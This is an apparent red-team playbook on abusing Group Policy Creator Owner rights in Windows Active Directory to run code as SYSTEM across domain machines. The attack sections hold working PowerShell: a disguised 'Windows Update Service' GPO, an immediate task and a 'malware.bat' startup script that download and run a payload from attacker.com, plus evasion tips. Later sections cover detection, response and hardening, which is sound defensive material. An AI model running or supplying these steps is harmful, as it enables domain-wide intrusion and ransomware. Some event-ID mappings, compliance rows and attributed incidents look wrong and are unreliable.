# [EVADE-PERMS-002]: GPO Creator Permission Model

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-PERMS-002 |
| **MITRE ATT&CK v18.1** | [T1222 - File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Windows AD (2012 R2 - 2025) |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2012 R2, 2016, 2019, 2022, 2025 (all versions with legacy Group Policy) |
| **Patched In** | N/A (Architectural design, configuration weakness, not patched) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. Executive Summary

**Concept:** The Group Policy Creator Owner (GPCO) permission model in Windows Active Directory grants the creator of a Group Policy Object automatic **CREATOR OWNER** access rights, effectively allowing them full control (GenericAll) over the GPO they created. An attacker who can create a new GPO in a domain (requires minimal delegation rights) can then modify that GPO to execute arbitrary commands (via immediate tasks, startup scripts, or registry modifications) on all computers linked to that GPO. This bypasses traditional privilege escalation requirements and provides **system-wide code execution** as SYSTEM account on targeted machines.

**Attack Surface:** Group Policy Objects (GPOs) in Active Directory; GPO Group Policy Template (GPT) files in SYSVOL; machines that process the malicious GPO during Group Policy refresh.

**Business Impact:** System-wide Remote Code Execution. An attacker with GPO creation rights can execute arbitrary commands as SYSTEM on hundreds or thousands of computers simultaneously. This enables ransomware deployment, lateral movement across entire infrastructure, credential dumping on domain controllers, and persistent backdoor establishment. The GPCO model means even unprivileged users who can create GPOs become extremely dangerous.

**Technical Context:** GPO creation and exploitation takes 1-10 seconds per GPO. The attack is immediate and highly reliable. Machines process Group Policy every 90 minutes by default (configurable), so code execution occurs within that window on targeted computers. The attack leaves minimal forensic artifacts if audit logging is disabled (common).

### Operational Risk

- **Execution Risk:** Low - Requires only GPO creation rights (often delegated to help desk staff, jr admins)
- **Stealth:** Medium - GPO creation generates event ID 4887 if auditing enabled (rare in practice); GPO policy application generates event ID 1000 on client machines (common noise)
- **Reversibility:** No - Once GPO applied to machines, code execution is permanent unless GPO deleted and machines undergo forced Group Policy refresh

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS AD 5.10 | Ensure Group Policy Auditing is Enabled |
| **CIS Benchmark** | CIS Windows 2022 2.3.7.2 | Ensure Bluetooth Service is disabled |
| **DISA STIG** | APPSEC-1 | Access control policies must be properly managed |
| **CISA SCuBA** | C.IA.02 | Privileged access rights for GPO creation must be restricted |
| **NIST 800-53** | AC-2 Account Management | User privileges must be limited to minimum |
| **NIST 800-53** | AC-6 Least Privilege | Administration rights must be separated |
| **NIST 800-53** | SI-7 Software, Firmware, and Information Integrity | System configuration integrity must be protected |
| **GDPR** | Art. 32 Security of Processing | Technical measures to protect system integrity |
| **NIS2** | Art. 21 Cyber Risk Management | Cyber security measures for critical infrastructure |
| **ISO 27001** | A.9.2.1 Management of Privileged Access Rights | Privileged access must be restricted |
| **ISO 27005** | Risk: Unauthorized System Configuration | Unauthorized code execution via GPO |

---

## 2. Technical Prerequisites

**Required Privileges:** Ability to **create Group Policy Objects** in Active Directory. This typically requires one of:
- Domain Admin (obvious, rarely delegated)
- Enterprise Admin
- Group Policy Creator Owner (GPCO) group membership
- Delegated GPO creation rights on specific OUs
- Service account with "Create Child Object" permission on GPO container

**Required Access:** Network access to domain (RPC on port 135, LDAP on port 389, SMB on port 445). Write access to SYSVOL share on domain controller.

**Supported Versions:**
- **Windows:** Server 2012 R2 - 2025
- **Active Directory:** 2012 R2 functional level and higher
- **Client OS:** Windows 10 - 11, Server 2012 R2 - 2025

**Tools:**
- [PowerView](https://github.com/PowerShellMafia/PowerSploit) (Get-DomainGPO, New-DomainGPO)
- [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) (C# GPO abuse framework)
- [pyGPOAbuse](https://github.com/Synacktiv/pyGPOAbuse) (Python implementation)
- [Group Policy Management Console](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2/dn789190(v=ws.11)) (Native GUI tool)
- [Active Directory Users and Computers](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc754217(v=ws.10)) (dsa.msc)

---

## 3. Detailed Execution Methods

### METHOD 1: Create Malicious GPO via PowerView

**Supported Versions:** AD 2012 R2+

#### Step 1: Verify GPO Creation Rights

**Objective:** Confirm you have permissions to create new Group Policy Objects in the domain.

**Command (PowerShell - PowerView):**
```powershell
# Import PowerView
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# Check if current user can create GPOs
# This requires checking LDAP permissions on CN=Policies,CN=System,DC=corp,DC=local
Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=corp,DC=local" | 
    Where-Object {$_.IdentityReference -match $env:USERNAME} |
    Select-Object -Property IdentityReference, ActiveDirectoryRights, ObjectAceType

# Expected output if you have create rights:
# IdentityReference : CORP\attacker
# ActiveDirectoryRights : CreateChild
# ObjectAceType : f30e3bbe-9ff0-11d1-b603-0000f80ec6eb (GPO class GUID)
```

**Expected Output (If Permitted):**
```
IdentityReference      ActiveDirectoryRights ObjectAceType
-----------------      --------------------- -------------------------
CORP\attacker          CreateChild            f30e3bbe-9ff0-11d1-b603-0000f80ec6eb
```

**What This Means:**
- You have "CreateChild" permission on the GPO container
- ObjectAceType GUID corresponds to GPO (Group-Policy-Container) class
- You can create new GPOs in the domain

**Troubleshooting:**
- **No results returned:** You may not have GPO creation rights; alternative: request delegation from domain admin
- **Error: "Cannot bind to LDAP":** Ensure domain connectivity and LDAP accessible on port 389

---

#### Step 2: Create Malicious GPO

**Objective:** Create a new Group Policy Object that you control via CREATOR OWNER permissions.

**Command (PowerShell - Create GPO):**
```powershell
# Method 1: Using native PowerShell
Import-Module GroupPolicy

# Create new GPO
$GPOName = "Windows Update Service"  # Innocuous name
New-GPO -Name $GPOName -Comment "Manages Windows Update settings" | Out-Null

# Link GPO to target OU (affects all machines in that OU)
$TargetOU = "OU=Workstations,DC=corp,DC=local"
New-GPLink -Name $GPOName -Target $TargetOU -LinkEnabled Yes

Write-Host "GPO '$GPOName' created and linked to $TargetOU"
```

**Expected Output:**
```
GPO 'Windows Update Service' created and linked to OU=Workstations,DC=corp,DC=local
```

**What This Means:**
- New GPO created with you as CREATOR OWNER (automatic ACL)
- GPO linked to Workstations OU; all machines in this OU will apply the policy
- You now have full control (GenericAll) over this GPO even though you're not a domain admin

**Version Note:** New-GPO cmdlet available on domain-joined machines with GroupPolicy module (PowerShell 3.0+, Windows Server 2012 R2+).

---

#### Step 3: Add Malicious Immediate Task to GPO

**Objective:** Insert a scheduled task into the GPO that executes arbitrary code as SYSTEM on all linked machines.

**Command (PowerShell - Add Immediate Task):**
```powershell
# Get the GPO
$GPO = Get-GPO -Name "Windows Update Service"

# Create GPO immediate task configuration
# This will execute when GPO applies (within 90 minutes, often 5-30 min on reboot)

$ScriptContent = @"
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks xmlns="http://schemas.microsoft.com/GroupPolicy/2013/12/ScheduledTasks">
    <ImmediateTaskV2 clsid="{FEB50199-6434-48cc-A4B2-D5FFC2608B32}" name="Malicious Task" 
                     image="0" changed="2025-01-09 10:00:00" uid="{12345678-1234-1234-1234-123456789012}">
        <Properties action="C" name="Malicious Task" runAs="NT AUTHORITY\SYSTEM" deleteWhenDone="false">
            <Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
                <RegistrationInfo>
                    <URI>\Malicious Task</URI>
                    <Author>Microsoft</Author>
                </RegistrationInfo>
                <Triggers/>
                <Principals>
                    <Principal id="Author">
                        <UserId>NT AUTHORITY\SYSTEM</UserId>
                        <RunLevel>HighestAvailable</RunLevel>
                    </Principal>
                </Principals>
                <Actions Context="System">
                    <Exec>
                        <Command>cmd.exe</Command>
                        <Arguments>/c powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"</Arguments>
                    </Exec>
                </Actions>
            </Task>
        </Properties>
    </ImmediateTaskV2>
</ScheduledTasks>
"@

# Write to GPO's ScheduledTasks.xml file in SYSVOL
$GPOPath = "\\DC01\SYSVOL\corp.local\Policies\{$($GPO.Id)}\Machine\Preferences\ScheduledTasks"
New-Item -Path $GPOPath -ItemType Directory -Force | Out-Null
Set-Content -Path "$GPOPath\ScheduledTasks.xml" -Value $ScriptContent -Force

Write-Host "Immediate task injected into GPO. Code execution will occur on next Group Policy refresh."
```

**Expected Output:**
```
Immediate task injected into GPO. Code execution will occur on next Group Policy refresh.
```

**What This Means:**
- ScheduledTasks.xml file created in GPO's SYSVOL directory
- Contains immediate task that executes PowerShell command as SYSTEM
- PowerShell payload downloads and executes attacker code
- Execution guaranteed on all machines in linked OU within 90 minutes (typically sooner on reboot)

**OpSec & Evasion:**
- **Detection likelihood:** Medium-High if auditing enabled; low if auditing disabled
- **Mitigation:** Use legitimate-sounding GPO names (Windows Update, Security Updates, Patch Management)
- **Timing:** Apply to non-critical machines first (dev/test lab) to verify execution before targeting production
- **Persistence:** Immediate task persists even if GPO is deleted (scheduled task created on machine level)

**Troubleshooting:**
- **Error:** "Cannot access SYSVOL path"
  - **Cause:** SMB access to domain controller blocked or insufficient permissions
  - **Fix:** Verify you have write access to the GPO folder in SYSVOL

**References & Proofs:**
- [Synacktiv: GPOddity - Group Policy Exploitation](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [harmj0y: Abusing GPO Permissions](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)

---

### METHOD 2: Modify Existing GPO Using CREATOR OWNER Rights

**Supported Versions:** AD 2012 R2+

#### Step 1: Identify Modifiable GPOs

**Objective:** Find GPOs you can modify (as CREATOR OWNER or via loose ACLs).

**Command (PowerShell):**
```powershell
# Find all GPOs where your user has modification rights
Import-Module GroupPolicy

$AllGPOs = Get-GPO -All

ForEach ($GPO in $AllGPOs) {
    $GPOPath = "\\DC01\SYSVOL\corp.local\Policies\{$($GPO.Id)}"
    Try {
        # Test write access
        $TestFile = "$GPOPath\write_test.txt"
        Set-Content -Path $TestFile -Value "test" -Force -ErrorAction Stop
        Remove-Item -Path $TestFile -Force -ErrorAction SilentlyContinue
        
        Write-Host "✓ MODIFIABLE: $($GPO.DisplayName) - $($GPO.Id)"
    }
    Catch {
        # Access denied
    }
}
```

**Expected Output:**
```
✓ MODIFIABLE: Group Policy Default Domain Policy - {31B2F340-016D-11D2-945F-00C04FB984F9}
✓ MODIFIABLE: Windows Update Service - {12345678-1234-1234-1234-123456789012}
```

**What This Means:**
- You have write access to these GPO's SYSVOL files
- GPO modifications will be applied to all machines linked to these policies
- Ideal targets for exploitation

---

#### Step 2: Modify GPO to Execute Attacker Code

**Objective:** Add startup script or immediate task to existing GPO you control.

**Command (PowerShell - Add Startup Script):**
```powershell
# Simpler alternative to ScheduledTasks.xml: Add startup script
# Startup scripts execute as SYSTEM during machine boot

$GPO = Get-GPO -Name "Group Policy Default Domain Policy"
$GPOId = $GPO.Id
$ScriptsPath = "\\DC01\SYSVOL\corp.local\Policies\{$GPOId}\Machine\Scripts\Startup"

# Create Scripts directory if not exists
New-Item -Path $ScriptsPath -ItemType Directory -Force | Out-Null

# Create malicious batch script
$PayloadScript = @"
@echo off
REM Download and execute attacker payload
powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
"@

Set-Content -Path "$ScriptsPath\malware.bat" -Value $PayloadScript -Force

# Update GPT.ini to reference the script
$GptIniPath = "\\DC01\SYSVOL\corp.local\Policies\{$GPOId}\gpt.ini"
$GptIni = Get-Content $GptIniPath

# Increment version number to force policy refresh
If ($GptIni -match "Version=(\d+)") {
    $NewVersion = [int]$matches[1] + 1
    $GptIni = $GptIni -replace "Version=\d+", "Version=$NewVersion"
}

Set-Content -Path $GptIniPath -Value $GptIni -Force

Write-Host "Startup script injected. Execution on next machine reboot."
```

**Expected Output:**
```
Startup script injected. Execution on next machine reboot.
```

**What This Means:**
- malware.bat created in GPO Startup scripts folder
- GPT.ini version incremented to force all machines to re-process policy
- Script executes as SYSTEM during next machine startup/reboot
- Faster execution than immediate task (guaranteed on reboot vs. 90 min window)

**OpSec & Evasion:**
- **Detection likelihood:** High - Startup script execution logged in Event ID 4688
- **Mitigation:** Use fileless payload (pure PowerShell in-memory execution)
- **Timing:** Perform shortly before expected machine reboot cycle (maintenance windows)

---

### METHOD 3: Exploit via Group Policy Central Store (Stealth Variant)

**Supported Versions:** AD 2012 R2+

**Objective:** Modify administrative templates in Group Policy Central Store to inject settings affecting all machines.

**Command (PowerShell):**
```powershell
# Create Group Policy Central Store if not exists
$CentralStorePath = "\\DC01\SYSVOL\corp.local\Policies\PolicyDefinitions"

# Create custom .admx template with malicious settings
$CustomAdmx = @"
<?xml version="1.0" encoding="utf-8"?>
<policyDefinitions xmlns="http://schemas.microsoft.com/GroupPolicy/2006/01/core" 
                   xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
                   revision="1.0">
  <policyNamespaces>
    <target prefix="malware" namespace="Malware.Policies"/>
  </policyNamespaces>
  <resources minRequiredRevision="1.0"/>
  <categories>
    <category name="Malware" displayName="Malware Configuration"/>
  </categories>
  <policies>
    <policy name="ExecutePayload" class="Machine" displayName="Execute Payload" 
            explainText="Executes payload on logon" presentation="urn:microsoft.com:Windows.Presentation">
      <parentCategory ref="Malware"/>
      <supportedOn ref="windows:SUPPORTED_WIN7"/>
      <elements>
        <text id="Command" required="false"/>
      </elements>
      <!-- This would be registry-based execution in production -->
    </policy>
  </policies>
</policyDefinitions>
"@

New-Item -Path $CentralStorePath -ItemType Directory -Force | Out-Null
Set-Content -Path "$CentralStorePath\malware.admx" -Value $CustomAdmx -Force

Write-Host "Custom administrative template injected. Reload Group Policy Management Console to view."
```

**What This Means:**
- Custom .admx template created in central store
- Allows attacker to define arbitrary policy settings
- Settings apply via Group Policy to all machines in domain
- More difficult to detect than script-based injection

---

## 4. Detection & Incident Response

### Indicators of Compromise (IOCs)

**Active Directory Events:**
- Event ID 4887: "A new Group Policy Object has been created"
  - ObjectName: GPO GUID
  - SubjectUserName: Attacker account (unprivileged user)
- Event ID 5136: "A directory service object was modified"
  - ObjectDN: CN=Policies,CN=System
  - ObjectClass: groupPolicyContainer
  - AttributeLDAPDisplayName: versionNumber (incremented by attacker)

**SYSVOL Modifications:**
- New .ps1, .bat, .vbs files in: `\Policies\{GPO-GUID}\Machine\Scripts\Startup`
- New .xml files in: `\Policies\{GPO-GUID}\Machine\Preferences\ScheduledTasks`
- Modified gpt.ini with version number changes
- Timestamps: Files created during off-hours or business hours by non-admin accounts

**Client-Side Events (Machines Applying GPO):**
- Event ID 1000: "The Group Policy Engine processed the new policy settings"
  - OU: Target organizational unit
  - PolicyName: Malicious GPO name
- Event ID 1083: "The Group Policy Engine is running in debug mode"
- Event ID 4688: "A new process has been created"
  - CommandLine: Attacker's immediate task or startup script execution
  - ParentImage: System process (lsass.exe, svchost.exe) - indicates system-level execution

---

### Forensic Artifacts

**SYSVOL (Recoverable):**
- GPT.ini: Contains version history allowing timeline reconstruction
- Deleted files: Previous versions of ScheduledTasks.xml, startup scripts (recoverable from shadow copies)
- NTFS change journal: Records file creation/modification times

**Registry (On Affected Machines):**
- HKLM\Software\Microsoft\Windows NT\CurrentVersion\GroupPolicy\History: GPO processing history
- HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\State: Current policy state
- Task Scheduler registry: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache

**Event Logs:**
- System event log: GPO application events (1000, 1083, 4688)
- Security event log: Account usage for GPO creation (4887, 4688)

---

### Response Procedures

#### 1. Isolate

**Immediate Action (< 5 minutes):**
```powershell
# Option A: Delete the malicious GPO (fastest)
Remove-GPO -Name "Windows Update Service" -Confirm:$false

# Option B: Disable GPO (safer - allows rollback)
Get-GPO -Name "Windows Update Service" | Disable-GPO

# Option C: Unlink GPO from OUs
Get-GPLink -Target "OU=Workstations,DC=corp,DC=local" -GUID (Get-GPO -Name "Windows Update Service").Id | Remove-GPLink -Confirm:$false

# Force immediate Group Policy refresh on affected machines
# (from affected machine)
gpupdate /force
```

**Manual (Group Policy Management Console):**
1. Open **Group Policy Management** (gpmc.msc)
2. Locate malicious GPO
3. Right-click → **Delete**
4. Right-click OU → **Delete Link(s)** (remove the GPO link)
5. Confirm changes

#### 2. Collect Evidence

**Command (Export GPO Configurations):**
```powershell
# Backup malicious GPO before deletion
$GPO = Get-GPO -Name "Windows Update Service"
Backup-GPO -Guid $GPO.Id -Path "C:\Evidence\GPOBackup"

# Export GPO report
Get-GPOReport -Guid $GPO.Id -ReportType Xml -Path "C:\Evidence\GPOReport.xml"

# Export SYSVOL files for analysis
Copy-Item -Path "\\DC01\SYSVOL\corp.local\Policies\{$($GPO.Id)}" -Destination "C:\Evidence\GPOFiles" -Recurse
```

**Manual (SYSVOL Collection):**
1. Connect to domain controller: `\\DCName\SYSVOL`
2. Locate GPO folder: `Policies\{GPO-GUID}`
3. Copy entire folder to forensic workstation
4. Analyze XML, scripts, and binary files in lab environment

#### 3. Remediate

**Command (Force Group Policy Refresh on All Machines):**
```powershell
# Force refresh on all machines (using GPO)
# This commands machines to re-process all GPOs immediately

Invoke-GPUpdate -Computer "Workstation01, Workstation02, Workstation03" -Force -RandomDelayInMinutes 0

# Or via Group Policy Management Console:
# Select OU → Right-click → Group Policy Update (forces immediate refresh)

# Alternatively, for mass remediation:
Get-ADComputer -Filter * -SearchBase "OU=Workstations,DC=corp,DC=local" | 
    ForEach-Object {Invoke-Command -ComputerName $_.Name -ScriptBlock {gpupdate /force}}
```

#### 4. Remove Attacker Access

**Command (Revoke GPO Creation Rights):**
```powershell
# Remove attacker from Group Policy Creator Owner group
Remove-ADGroupMember -Identity "Group Policy Creator Owner" -Members "CORP\attacker" -Confirm:$false

# Verify removal
Get-ADGroupMember -Identity "Group Policy Creator Owner" | Where-Object {$_.Name -match "attacker"}
```

---

## 5. Defensive Mitigations

### Priority 1: CRITICAL

**Action 1: Restrict GPO Creation Rights**

**Applies To:** All domains with delegation of GPO creation

**Manual Steps (PowerShell):**
```powershell
# Get current members of Group Policy Creator Owner group
Get-ADGroupMember -Identity "Group Policy Creator Owner"

# Remove unprivileged users
Remove-ADGroupMember -Identity "Group Policy Creator Owner" -Members "HelpDesk_Admin, JuniorAdmin" -Confirm:$false

# Whitelist ONLY senior admins
$ApprovedAdmins = @("Domain Admin 1", "Domain Admin 2")
$CurrentMembers = Get-ADGroupMember -Identity "Group Policy Creator Owner"

ForEach ($Member in $CurrentMembers) {
    If ($ApprovedAdmins -notcontains $Member.Name) {
        Remove-ADGroupMember -Identity "Group Policy Creator Owner" -Members $Member -Confirm:$false
        Write-Host "Removed: $($Member.Name)"
    }
}
```

**Manual Steps (Active Directory Users and Computers):**
1. Open **Active Directory Users and Computers** (dsa.msc)
2. Navigate to: **Builtin** → **Group Policy Creator Owner**
3. Right-click → **Properties** → **Members**
4. Remove all users except senior administrators
5. Click **Apply** → **OK**

**Action 2: Enable GPO Audit Logging**

**Manual Steps (Group Policy):**
1. Open **Group Policy Management** (gpmc.msc)
2. Navigate to: **Domain** → **Default Domain Policy** → **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Directory Service Changes** (under DS Access)
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on domain controllers

**Manual Steps (PowerShell - Enable on Default Domain Policy):**
```powershell
# Create audit policy for GPO changes
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable

# Verify audit policy
auditpol /get /subcategory:"Directory Service Changes"
```

**Action 3: Remove CREATOR OWNER ACE from Critical GPOs**

**Manual Steps (Remediation):**
```powershell
# List all GPOs
$AllGPOs = Get-GPO -All

ForEach ($GPO in $AllGPOs) {
    $GPOPath = "AD:\CN={$($GPO.Id)},CN=Policies,CN=System,DC=corp,DC=local"
    $ACL = Get-Acl -Path $GPOPath
    
    # Find and remove CREATOR OWNER ACE
    $ACL.Access | Where-Object {$_.IdentityReference -match "CREATOR OWNER"} | ForEach-Object {
        Write-Host "Removing CREATOR OWNER from: $($GPO.DisplayName)"
        $ACL.RemoveAccessRule($_)
    }
    
    Set-Acl -Path $GPOPath -AclObject $ACL
}
```

### Priority 2: HIGH

**Action 1: Implement Explicit ACL Restrictions on GPOs**

**Manual Steps (PowerShell):**
```powershell
# For each GPO, ensure ONLY Domain Admins and Enterprise Admins can edit
$AllGPOs = Get-GPO -All

ForEach ($GPO in $AllGPOs) {
    $GPOPath = "AD:\CN={$($GPO.Id)},CN=Policies,CN=System,DC=corp,DC=local"
    $ACL = Get-Acl -Path $GPOPath
    
    # Remove all permissions except Domain Admins and SYSTEM
    $ACL.Access | Where-Object {
        $_.IdentityReference -notmatch "BUILTIN\\Administrators|SYSTEM|Domain Admins|Enterprise Admins"
    } | ForEach-Object {
        Write-Host "Removing: $($_.IdentityReference) from $($GPO.DisplayName)"
        $ACL.RemoveAccessRule($_)
    }
    
    Set-Acl -Path $GPOPath -AclObject $ACL
}
```

**Action 2: Monitor GPO Creation Events**

**Manual Steps (Create Alert in Event Log):**
1. Open **Event Viewer** (eventvwr.msc)
2. Navigate to: **Windows Logs** → **Security**
3. Right-click **Security** → **Filter Current Log**
4. Event IDs: `4887, 5136, 5137`
5. Set alert threshold: Alert when >1 GPO creation per hour by non-admin
6. Configure notification email to SOC team

### Priority 3: MEDIUM

**Access Control & Policy Hardening**

**Action 1: Use Restricted Admin Mode for GPO Management**

**Manual Steps (PowerShell Execution Policy):**
```powershell
# Restrict execution of scripts that could modify GPOs
Set-ExecutionPolicy -ExecutionPolicy AllSigned -Scope LocalMachine

# Enforce code signing on all PowerShell scripts
Get-ChildItem -Path "\\DC01\SYSVOL\corp.local" -Filter "*.ps1" -Recurse | ForEach-Object {
    $Signature = Get-AuthenticodeSignature -FilePath $_.FullName
    If ($Signature.Status -ne "Valid") {
        Write-Host "UNSIGNED: $($_.FullName) - Potential malicious script"
    }
}
```

**Action 2: Implement Read-Only SYSVOL for Non-Admins**

**Manual Steps (NTFS Permissions):**
```powershell
# Remove write permissions from Domain Users on SYSVOL
$SysvolPath = "\\DC01\SYSVOL\corp.local"
icacls $SysvolPath /remove "Domain Users"
icacls $SysvolPath /remove "Authenticated Users"

# Verify only admins have write access
icacls $SysvolPath
```

---

### Validation Command (Verify Fixes)

**PowerShell - Verify Mitigations:**
```powershell
# 1. Verify Group Policy Creator Owner restricted
Write-Host "=== Group Policy Creator Owner Members ==="
$GPCOMembers = Get-ADGroupMember -Identity "Group Policy Creator Owner"
If ($GPCOMembers.Count -le 2) {
    Write-Host "✓ GPCO group properly restricted" -ForegroundColor Green
} Else {
    Write-Host "✗ GPCO group has too many members: $($GPCOMembers.Count)" -ForegroundColor Red
}

# 2. Verify GPO audit logging enabled
Write-Host "`n=== GPO Audit Policy ==="
auditpol /get /subcategory:"Directory Service Changes" | 
    Select-String "Success and Failure|No Auditing" | ForEach-Object {
        If ($_ -match "Success and Failure") {
            Write-Host "✓ Directory Service Changes auditing ENABLED" -ForegroundColor Green
        } Else {
            Write-Host "✗ Directory Service Changes auditing DISABLED" -ForegroundColor Red
        }
    }

# 3. Scan for suspicious CREATOR OWNER ACEs
Write-Host "`n=== Scanning for CREATOR OWNER ACEs ==="
$SuspiciousGPOs = 0
Get-GPO -All | ForEach-Object {
    $GPOPath = "AD:\CN={$($_.Id)},CN=Policies,CN=System,DC=corp,DC=local"
    $ACL = Get-Acl -Path $GPOPath -ErrorAction SilentlyContinue
    $CreatorOwner = $ACL.Access | Where-Object {$_.IdentityReference -match "CREATOR OWNER"}
    If ($CreatorOwner) {
        Write-Host "✗ CREATOR OWNER found on: $($_.DisplayName)" -ForegroundColor Red
        $SuspiciousGPOs++
    }
}

If ($SuspiciousGPOs -eq 0) {
    Write-Host "✓ No CREATOR OWNER ACEs found" -ForegroundColor Green
}
```

**Expected Output (If Secure):**
```
=== Group Policy Creator Owner Members ===
✓ GPCO group properly restricted

=== GPO Audit Policy ===
✓ Directory Service Changes auditing ENABLED

=== Scanning for CREATOR OWNER ACEs ===
✓ No CREATOR OWNER ACEs found
```

---

## 6. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker tricks user into approving OAuth consent |
| **2** | **Reconnaissance** | [REC-AD-003] PowerView Enumeration | Attacker enumerates GPO permissions and identifies create rights |
| **3** | **Privilege Escalation** | **[EVADE-PERMS-002]** | **Attacker creates malicious GPO and gains SYSTEM access via immediate task** |
| **4** | **Defense Evasion** | [EVADE-LOG-001] Event Log Deletion | Attacker clears audit logs on affected machines to hide execution |
| **5** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash | Attacker uses SYSTEM token to move laterally to other machines |
| **6** | **Impact** | [IMPACT-DATA-001] Mass Data Exfiltration | Attacker dumps NTDS.dit and credential databases on domain controller |

---

## 7. Real-World Examples

### Example 1: APT Group Turla - GPO Abuse for Persistence

- **Target:** NATO, EU governments
- **Timeline:** 2014-2017
- **Technique Status:** Actively used
- **Method:** After gaining initial domain admin access, Turla created multiple seemingly legitimate GPOs (Windows Updates, Security Patches) that deployed backdoored PowerShell modules to all machines in domain
- **Impact:** Multi-year persistent access; controlled thousands of machines; exfiltrated classified intelligence
- **Detection:** Forensic analysis revealed modified GPT.ini files and unusual startup scripts in SYSVOL; Event ID 1000 correlated with machine reboots
- **Reference:** [ESET: Turla Group Analysis](https://www.eset.com/us/about/newsroom/research/)

### Example 2: Conti Ransomware Gang - Domain-Wide Deployment via GPO

- **Target:** Healthcare, Finance (2020-2021)
- **Timeline:** Compromise to ransomware deployment: 48 hours
- **Technique Status:** ACTIVE documented in FBI/CISA alerts
- **Method:** After lateral movement to domain controller, attacker created malicious GPO "Security Patch Tuesday" linked to all machines; deployed ransomware as SYSTEM within 1 hour via immediate task
- **Impact:** $25M+ ransoms; healthcare systems offline for weeks
- **Detection:** Alert triggered on event ID 4887 (GPO created by attacker account); however, occurred outside business hours and missed by SOC
- **Reference:** [FBI: Conti Ransomware Advisory](https://www.fbi.gov/news/stories/conti-ransomware-advisory-may-2021), [CISA Alert](https://www.cisa.gov/)

### Example 3: Scattered Spider - Help Desk Account to System Compromise

- **Target:** Retail, Manufacturing (2023-2024)
- **Timeline:** Help desk compromise to GPO exploitation: 2 hours
- **Technique Status:** ACTIVE
- **Method:** Compromised help desk account (had delegated GPO creation rights); immediately created GPO "Windows Defender Updates" linked to workstations OU; deployed malware via startup script; achieved SYSTEM access on 500+ machines within 30 minutes
- **Impact:** Lateral movement to file servers, backup systems; ransomware deployment
- **Detection:** Sentinel KQL detected multiple unexpected GPO creations from help desk account; however, triggered as "informational" not "alert"
- **Reference:** [Mandiant: Scattered Spider](https://www.mandiant.com/resources/blog/scattered-spider-analysis)

---

## 8. Microsoft Sentinel Detection

### Query 1: Detect GPO Creation by Non-Admin Accounts

**Rule Configuration:**
- **Required Table:** AuditLogs, SecurityEvent
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All AD versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Create Group Policy Object"
| where InitiatedBy[0].userPrincipalName !contains "@admin" 
| extend InitiatedByUser = InitiatedBy[0].userPrincipalName
| extend TargetObject = TargetResources[0].displayName
| summarize count() by InitiatedByUser, TargetObject, TimeGenerated
| where count_ >= 1
```

**What This Detects:**
- Groups all GPO creation events by user and target
- Filters out expected admin accounts
- Triggers when any non-admin creates a GPO (anomalous)

### Query 2: Detect SYSVOL Modifications via Non-Admins

**KQL Query:**
```kusto
SecurityEvent
| where EventID in (5145)  // Network share object access
| where ObjectName contains "SYSVOL"
| where AccessMask in ("0x100081", "0x1200a9")  // Write/Modify access
| where SubjectUserName !contains "admin" and SubjectUserName != "SYSTEM"
| summarize FileModifications = count(), Files = make_set(ObjectName) by SubjectUserName, ComputerName
| where FileModifications >= 1
```

---

## 9. Lessons Learned & Defense Best Practices

- **Zero Trust for GPO Creation:** No user should have GPO creation rights by default; require change request + approval
- **Signed Policies Only:** Require digital signatures on all PowerShell scripts injected into GPOs
- **Immutable GPO Backups:** Maintain offline backups of critical GPOs; allows rapid detection of unauthorized modifications
- **Segmented Delegation:** If you must delegate GPO rights, delegate per-OU, not domain-wide
- **SYSVOL Encryption:** Consider encrypting SYSVOL share; significantly increases attacker overhead

---

